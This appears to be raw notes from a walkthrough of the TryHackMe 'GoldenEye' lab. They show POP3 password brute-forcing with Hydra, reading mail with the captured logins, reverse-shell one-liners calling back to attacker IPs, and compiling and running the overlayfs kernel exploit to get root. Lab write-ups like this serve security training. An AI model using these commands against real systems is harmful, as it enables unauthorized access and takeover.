@@ -1,0 +1,403 @@
+
+rustscan -a 10.10.253.205 --range 1-65560
+
+From HTML Entity
+https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity()&input=JiM3MzsmIzExMDsmIzExODsmIzEwNTsmIzExMDsmIzk5OyYjMTA1OyYjOTg7JiMxMDg7JiMxMDE7JiM3MjsmIzk3OyYjOTk7JiMxMDc7JiM1MTsmIzExNDs
+
+
+boris:InvincibleHack3r
+
+curl -user boris:InvincibleHack3r 10.10.253.205/sev-home/ | tail -f
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1125  100  1125    0     0   2494      0 --:--:-- --:--:-- --:--:--  2494
+ 
+
+
+Qualified GoldenEye Network Operator Supervisors: 
+Natalya
+Boris
+
+ -->
+
+</html>
+
+
+or view-source:http://10.10.253.205/sev-home/
+
+hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://10.10.53.242:55007
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-13 10:57:17
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.53.242:55007/
+[STATUS] 64.00 tries/min, 64 tries in 00:01h, 158 to do in 00:03h, 16 active
+[55007][pop3] host: 10.10.53.242   login: natalya   password: bird
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-13 10:59:56
+natalya:bird
+
+hydra -l boris -P /usr/share/wordlists/rockyou.txt pop3://10.10.253.205:55007
+hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://10.10.142.87:55007 
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-13 17:14:48
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.142.87:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.142.87   login: boris   password: secret1!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-13 17:17:41
+boris:secret1!
+
+
+
+telnet 10.10.142.87 55007                                                                                                           1 ⨯
+Trying 10.10.142.87...
+Connected to 10.10.142.87.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+user boris
++OK
+pass secret1!
++OK Logged in.
+list
++OK 3 messages:
+1 544
+2 373
+3 921
+
+retr 1
++OK 544 octets
+Return-Path: <root@127.0.0.1.goldeneye>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id D9E47454B1
+        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+Message-Id: <20180425022326.D9E47454B1@ubuntu>
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: root@127.0.0.1.goldeneye
+
+Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
+.
+retr 2
++OK 373 octets
+Return-Path: <natalya@ubuntu>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id C3F2B454B1
+        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: <20180425024249.C3F2B454B1@ubuntu>
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu
+
+Boris, I can break your codes!
+.
+retr 3
++OK 921 octets
+Return-Path: <alec@janus.boss>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: <20180425025235.4B9F4454B1@ubuntu>
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+
+
+
+
+└─# telnet 10.10.142.87 55007                                                                                                           1 ⨯
+Trying 10.10.142.87...
+Connected to 10.10.142.87.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+user natalya
++OK
+pass bird
++OK Logged in.
+list
++OK 2 messages:
+1 631
+2 1048
+
+retr 1
++OK 631 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id D5EDA454B1
+        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: <20180425024542.D5EDA454B1@ubuntu>
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+
+-ERR Unknown command: 
+retr 2
++OK 1048 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 17C96454B1
+        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: <20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+
+username: xenia
+password: RCP90rulez!
+
+view message
+http://severnaya-station.com/gnocertdir/message/index.php?viewing=unread&user2=5
+
+---> user Dr Doak
+hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.10.142.87:55007
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-13 17:30:13
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.142.87:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[STATUS] 66.50 tries/min, 133 tries in 00:02h, 89 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.142.87   login: doak   password: goat
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-13 17:32:37
+
+doak:goat
+
+
+telnet 10.10.142.87 55007                                                                                                           1 ⨯
+Trying 10.10.142.87...
+Connected to 10.10.142.87.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+user doak
++OK
+pass goat
++OK Logged in.
+list
++OK 1 messages:
+1 606
+.
+retr 1
++OK 606 octets
+Return-Path: <doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 97DC24549D
+        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: <20180425034731.97DC24549D@ubuntu>
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+
+http://severnaya-station.com/gnocertdir/user/files.php
+
+--> my rivate files ---> s3cret.txt
+cat s3crett.txt
+007,
+
+I was able to capture this apps adm1n cr3ds through clear txt. 
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+
+It reveals that admin credentials have been found, and probably hidden in a picture located at /dir007key/for-007.jpg. 
+
+
+wget http://severnaya-station.com/dir007key/for-007.jpg
+exiftool for-007.jpg
+ExifTool Version Number         : 12.32
+File Name                       : for-007.jpg
+Directory                       : .
+File Size                       : 15 KiB
+File Modification Date/Time     : 2018:04:25 07:40:02+07:00
+File Access Date/Time           : 2021:11:13 17:43:13+07:00
+File Inode Change Date/Time     : 2021:11:13 17:43:13+07:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+X Resolution                    : 300
+Y Resolution                    : 300
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Image Description               : eFdpbnRlcjE5OTV4IQ==
+Make                            : GoldenEye
+Resolution Unit                 : inches
+Software                        : linux
+Artist                          : For James
+Y Cb Cr Positioning             : Centered
+Exif Version                    : 0231
+Components Configuration        : Y, Cb, Cr, -
+User Comment                    : For 007
+Flashpix Version                : 0100
+Image Width                     : 313
+Image Height                    : 212
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 313x212
+Megapixels                      : 0.066
+
+
+
+Image Description               : eFdpbnRlcjE5OTV4IQ==
+
+echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d                                                                 
+xWinter1995x!
+
+search spell
+change Spell engine from google shell --->PSpellShell
+ Path to aspellaspellpath  ---> 
+ 
+ 
+ sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'
+ 
+ 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.52.16",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+ 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.11.52.16",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'  
+
+on my machine
+nc -lnvp 4445
+
+
+earchsploit 3.13.0                                                                                                               130 ⨯
+---------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation      | linux/local/37292.c
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Acc | linux/local/37293.txt
+---------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                                                                                                                                            
+┌──(root💀luc)-[/home/gd/Desktop/THM/GoldenEye]
+└─# searchsploit -m linux/local/37292.c    
+  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/37292
+     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
+File Type: C source, ASCII text, with very long lines
+
+Copied to: /home/gd/Desktop/THM/GoldenEye/37292.c
+
+
+
+
+    Linux Exploit Suggester 2
+  #############################
+
+  Local Kernel: 3.13.0
+  Searching 72 exploits...
+
+  Possible Exploits
+  [1] exploit_x
+      CVE-2018-14665
+      Source: http://www.exploit-db.com/exploits/45697
+  [2] overlayfs
+      CVE-2015-8660
+      Source: http://www.exploit-db.com/exploits/39230
+  [3] pp_key
+      CVE-2016-0728
+      Source: http://www.exploit-db.com/exploits/39277
+  [4] timeoutpwn
+      CVE-2014-0038
+      Source: http://www.exploit-db.com/exploits/31346
+
+www-data@ubuntu:/tmp$ cc 37292.c -o exploit
+cc 37292.c -o exploit
+37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
+}
+^
+37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
+        if(unshare(CLONE_NEWUSER) != 0)
+           ^
+37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+                ^
+37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
+            waitpid(pid, &status, 0);
+            ^
+37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
+    wait(NULL);
+    ^
+5 warnings generated.
+www-data@ubuntu:/tmp$ ./exploit
+./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+# 
+# find / -type f -name "*flag.txt" 2>/dev/null
+/root/.flag.txt
+# cat /root/.flag.txt
+Alec told me to place the codes here: 
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
+
+# 
+
+
+https://tryhackme.com/room/goldeneye
+https://martinkubecka.github.io/posts/thm/goldeneye/
+https://www.aldeid.com/wiki/TryHackMe-GoldenEye
